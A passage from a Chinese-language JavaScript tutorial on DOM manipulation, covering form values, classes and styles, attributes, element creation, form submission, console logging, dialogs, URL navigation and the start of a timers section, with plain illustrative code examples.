select = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;country&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(select.<span class="property">value</span>); <span class="comment">// 获取选中值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(select.<span class="property">selectedIndex</span>); <span class="comment">// 获取选中索引</span></span><br><span class="line">select.<span class="property">selectedIndex</span> = <span class="number">1</span>; <span class="comment">// 设置选中项</span></span><br><span class="line">select.<span class="property">value</span> = <span class="string">&quot;cn&quot;</span>; <span class="comment">// 通过值设置选中项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复选框</span></span><br><span class="line"><span class="keyword">var</span> checkbox = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;subscribe&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(checkbox.<span class="property">checked</span>); <span class="comment">// 检查是否选中</span></span><br><span class="line">checkbox.<span class="property">checked</span> = <span class="literal">true</span>; <span class="comment">// 设置为选中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单选按钮组</span></span><br><span class="line"><span class="keyword">var</span> radios = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; radios.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (radios[i].<span class="property">checked</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;选中值: &quot;</span> + radios[i].<span class="property">value</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：表单验证</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;用户名至少需要5个字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-4-样式操作"><a href="#19-4-样式操作" class="headerlink" title="19.4 样式操作"></a>19.4 样式操作</h3><h4 id="19-4-1-样式操作"><a href="#19-4-1-样式操作" class="headerlink" title="19.4.1 样式操作"></a>19.4.1 样式操作</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>className</code>：获取或设置元素的class属性（字符串）</li>
<li><code>classList</code>：元素的类列表（DOMTokenList对象）</li>
<li><code>style</code>：元素的行内样式对象</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// className操作</span></span><br><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>);</span><br><span class="line">element.<span class="property">className</span> = <span class="string">&quot;highlight active&quot;</span>; <span class="comment">// 设置整个class</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">className</span>); <span class="comment">// &quot;highlight active&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// classList操作</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>); <span class="comment">// DOMTokenList</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>.<span class="property">length</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>[<span class="number">0</span>]); <span class="comment">// &quot;highlight&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加类</span></span><br><span class="line">element.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;new-class&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;new-class&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除类</span></span><br><span class="line">element.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;highlight&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;highlight&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 切换类</span></span><br><span class="line">element.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&quot;active&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;active&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换类</span></span><br><span class="line">element.<span class="property">classList</span>.<span class="title function_">replace</span>(<span class="string">&quot;new-class&quot;</span>, <span class="string">&quot;updated-class&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// style操作</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">element.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;yellow&quot;</span>;</span><br><span class="line">element.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;16px&quot;</span>;</span><br><span class="line">element.<span class="property">style</span>.<span class="property">padding</span> = <span class="string">&quot;10px&quot;</span>;</span><br><span class="line">element.<span class="property">style</span>.<span class="property">borderRadius</span> = <span class="string">&quot;5px&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取计算样式</span></span><br><span class="line"><span class="keyword">var</span> computedStyle = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(element);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(computedStyle.<span class="property">color</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(computedStyle.<span class="property">fontSize</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：动态切换主题</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toggleTheme</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (body.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;dark&quot;</span>)) &#123;</span><br><span class="line">        body.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">        body.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        body.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">        body.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：悬停效果</span></span><br><span class="line"><span class="keyword">var</span> buttons = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.button&quot;</span>);</span><br><span class="line">buttons.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">button</span>) &#123;</span><br><span class="line">    button.<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseover&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;#0066cc&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;white&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    button.<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseout&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="19-5-属性操作"><a href="#19-5-属性操作" class="headerlink" title="19.5 属性操作"></a>19.5 属性操作</h3><h4 id="19-5-1-属性操作"><a href="#19-5-1-属性操作" class="headerlink" title="19.5.1 属性操作"></a>19.5.1 属性操作</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>getAttribute()</code>：获取元素属性值</li>
<li><code>setAttribute()</code>：设置元素属性值</li>
<li><code>removeAttribute()</code>：移除元素属性</li>
<li><code>hasAttribute()</code>：检查元素是否有指定属性</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myLink&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取属性</span></span><br><span class="line"><span class="keyword">var</span> href = link.<span class="title function_">getAttribute</span>(<span class="string">&quot;href&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> target = link.<span class="title function_">getAttribute</span>(<span class="string">&quot;target&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(href, target);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置属性</span></span><br><span class="line">link.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, <span class="string">&quot;https://example.com&quot;</span>);</span><br><span class="line">link.<span class="title function_">setAttribute</span>(<span class="string">&quot;target&quot;</span>, <span class="string">&quot;_blank&quot;</span>);</span><br><span class="line">link.<span class="title function_">setAttribute</span>(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;示例链接&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除属性</span></span><br><span class="line">link.<span class="title function_">removeAttribute</span>(<span class="string">&quot;target&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查属性</span></span><br><span class="line"><span class="keyword">if</span> (link.<span class="title function_">hasAttribute</span>(<span class="string">&quot;title&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;链接有title属性&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义属性（data-*）</span></span><br><span class="line"><span class="keyword">var</span> dataValue = link.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-id&quot;</span>);</span><br><span class="line">link.<span class="title function_">setAttribute</span>(<span class="string">&quot;data-id&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dataValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：动态修改图片</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myImage&quot;</span>);</span><br><span class="line">img.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;new-image.jpg&quot;</span>);</span><br><span class="line">img.<span class="title function_">setAttribute</span>(<span class="string">&quot;alt&quot;</span>, <span class="string">&quot;新图片&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：添加aria属性提高可访问性</span></span><br><span class="line"><span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myButton&quot;</span>);</span><br><span class="line">button.<span class="title function_">setAttribute</span>(<span class="string">&quot;aria-label&quot;</span>, <span class="string">&quot;关闭窗口&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="19-6-创建和添加元素"><a href="#19-6-创建和添加元素" class="headerlink" title="19.6 创建和添加元素"></a>19.6 创建和添加元素</h3><h4 id="19-6-1-创建标签并添加到HTML"><a href="#19-6-1-创建标签并添加到HTML" class="headerlink" title="19.6.1 创建标签并添加到HTML"></a>19.6.1 创建标签并添加到HTML</h4><p><strong>详细解释：</strong></p>
<ul>
<li>两种主要方式：字符串方式和对象方式</li>
<li>字符串方式：使用<code>insertAdjacentHTML()</code></li>
<li>对象方式：使用<code>document.createElement()</code>和<code>appendChild()</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串方式</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">container.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&quot;beforeEnd&quot;</span>, <span class="string">&quot;&lt;p&gt;新段落&lt;/p&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// insertAdjacentHTML的位置参数</span></span><br><span class="line"><span class="comment">// &#x27;beforeBegin&#x27;: 在元素开始前插入</span></span><br><span class="line"><span class="comment">// &#x27;afterBegin&#x27;: 在元素开始标记后插入</span></span><br><span class="line"><span class="comment">// &#x27;beforeEnd&#x27;: 在元素结束标记前插入</span></span><br><span class="line"><span class="comment">// &#x27;afterEnd&#x27;: 在元素结束标记后插入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：在不同位置插入</span></span><br><span class="line">container.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&quot;beforeBegin&quot;</span>, <span class="string">&quot;&lt;div&gt;在容器前&lt;/div&gt;&quot;</span>);</span><br><span class="line">container.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&quot;afterBegin&quot;</span>, <span class="string">&quot;&lt;div&gt;在容器内开头&lt;/div&gt;&quot;</span>);</span><br><span class="line">container.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&quot;beforeEnd&quot;</span>, <span class="string">&quot;&lt;div&gt;在容器内结尾&lt;/div&gt;&quot;</span>);</span><br><span class="line">container.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&quot;afterEnd&quot;</span>, <span class="string">&quot;&lt;div&gt;在容器后&lt;/div&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象方式</span></span><br><span class="line"><span class="keyword">var</span> newDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">newDiv.<span class="property">className</span> = <span class="string">&quot;box&quot;</span>;</span><br><span class="line">newDiv.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;lightblue&quot;</span>;</span><br><span class="line">newDiv.<span class="property">textContent</span> = <span class="string">&quot;新创建的div&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newParagraph = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">newParagraph.<span class="property">textContent</span> = <span class="string">&quot;这是段落内容&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加子元素</span></span><br><span class="line">newDiv.<span class="title function_">appendChild</span>(newParagraph);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加到文档</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(newDiv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建更复杂的结构</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCard</span>(<span class="params">title, content</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> card = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    card.<span class="property">className</span> = <span class="string">&quot;card&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> cardTitle = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h2&quot;</span>);</span><br><span class="line">    cardTitle.<span class="property">textContent</span> = title;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> cardContent = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">    cardContent.<span class="property">textContent</span> = content;</span><br><span class="line">    </span><br><span class="line">    card.<span class="title function_">appendChild</span>(cardTitle);</span><br><span class="line">    card.<span class="title function_">appendChild</span>(cardContent);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> card;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> card = <span class="title function_">createCard</span>(<span class="string">&quot;示例卡片&quot;</span>, <span class="string">&quot;这是卡片内容&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;cards-container&quot;</span>).<span class="title function_">appendChild</span>(card);</span><br></pre></td></tr></table></figure>

<h3 id="19-7-表单操作"><a href="#19-7-表单操作" class="headerlink" title="19.7 表单操作"></a>19.7 表单操作</h3><p><strong>详细解释：</strong></p>
<ul>
<li>任何表单元素都可以通过DOM提交</li>
<li>使用<code>submit()</code>方法提交表单</li>
<li>可以阻止默认提交行为进行验证</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过DOM提交表单</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">submitForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 阻止默认提交行为</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myForm&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    event.<span class="title function_">preventDefault</span>(); <span class="comment">// 阻止默认提交</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行验证</span></span><br><span class="line">    <span class="keyword">var</span> username = <span class="variable language_">this</span>.<span class="property">username</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;用户名至少需要5个字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 验证通过后提交</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">submit</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任何元素都可以触发提交</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;customSubmit&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：表单重置</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">resetForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myForm&quot;</span>).<span class="title function_">reset</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：动态创建表单</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span><br><span class="line">    form.<span class="property">id</span> = <span class="string">&quot;dynamicForm&quot;</span>;</span><br><span class="line">    form.<span class="property">action</span> = <span class="string">&quot;/submit&quot;</span>;</span><br><span class="line">    form.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    input.<span class="property">type</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line">    input.<span class="property">name</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> submit = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">    submit.<span class="property">type</span> = <span class="string">&quot;submit&quot;</span>;</span><br><span class="line">    submit.<span class="property">value</span> = <span class="string">&quot;提交&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    form.<span class="title function_">appendChild</span>(input);</span><br><span class="line">    form.<span class="title function_">appendChild</span>(submit);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(form);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-8-其他DOM操作"><a href="#19-8-其他DOM操作" class="headerlink" title="19.8 其他DOM操作"></a>19.8 其他DOM操作</h3><h4 id="19-8-1-控制台输出"><a href="#19-8-1-控制台输出" class="headerlink" title="19.8.1 控制台输出"></a>19.8.1 控制台输出</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>console.log()</code>：普通日志</li>
<li><code>console.error()</code>：错误日志</li>
<li><code>console.warn()</code>：警告日志</li>
<li><code>console.info()</code>：信息日志</li>
<li><code>console.debug()</code>：调试日志</li>
<li><code>console.table()</code>：表格形式显示数据</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;普通日志&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;错误信息&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;警告信息&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;信息提示&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">debug</span>(<span class="string">&quot;调试信息&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">25</span>, <span class="attr">city</span>: <span class="string">&quot;北京&quot;</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">table</span>(user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> users = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&quot;李四&quot;</span>, <span class="attr">age</span>: <span class="number">30</span> &#125;</span><br><span class="line">];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">table</span>(users);</span><br></pre></td></tr></table></figure>

<h4 id="19-8-2-弹窗"><a href="#19-8-2-弹窗" class="headerlink" title="19.8.2 弹窗"></a>19.8.2 弹窗</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>alert()</code>：显示消息框</li>
<li><code>confirm()</code>：显示确认框，返回布尔值</li>
<li><code>prompt()</code>：显示输入框，返回用户输入</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// alert</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;欢迎访问本网站！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// confirm</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">confirm</span>(<span class="string">&quot;确定要删除吗？&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户确认删除&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户取消删除&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prompt</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="title function_">prompt</span>(<span class="string">&quot;请输入您的名字&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (name) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;欢迎，&quot;</span> + name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户未输入名字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：表单验证</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;用户名至少需要5个字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="19-8-3-URL和刷新"><a href="#19-8-3-URL和刷新" class="headerlink" title="19.8.3 URL和刷新"></a>19.8.3 URL和刷新</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>location.href</code>：获取或设置当前URL</li>
<li><code>location.reload()</code>：重新加载页面</li>
<li><code>history.back()</code>：返回上一页</li>
<li><code>history.forward()</code>：前进到下一页</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前URL</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">href</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">redirect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;https://example.com&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新加载页面</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">refreshPage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="title function_">reload</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过历史记录导航</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goBack</span>(<span class="params"></span>) &#123;</span><br><span class="line">    history.<span class="title function_">back</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goForward</span>(<span class="params"></span>) &#123;</span><br><span class="line">    history.<span class="title function_">forward</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换当前URL（不创建新历史记录）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">replaceUrl</span>(<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="title function_">replace</span>(<span class="string">&quot;https://example.com&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：定时重定向</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;https://example.com&quot;</span>;</span><br><span class="line">&#125;, <span class="number">5000</span>);</span><br></pre></td></tr></table></figure>

<h4 id="19-8-4-定时器"><a href="#19-8-4-定时器" class="headerlink" title="19.8.4 定时器"></a>19.8.4 定时器</h4><p><strong>详细解释：</strong></p>
<ul>
<li><code>setInterval()</code>：重复执行函数</li>
<li><code>clearInterval()</code>：清除重复执行的定时器</li>
<li><code>setTimeout()</code>：延迟执行函数</li>
<li><code>clearTimeout()</code>：清除延迟执行的定时器</li>
</ul>
<p><strong>示例：</strong></p>
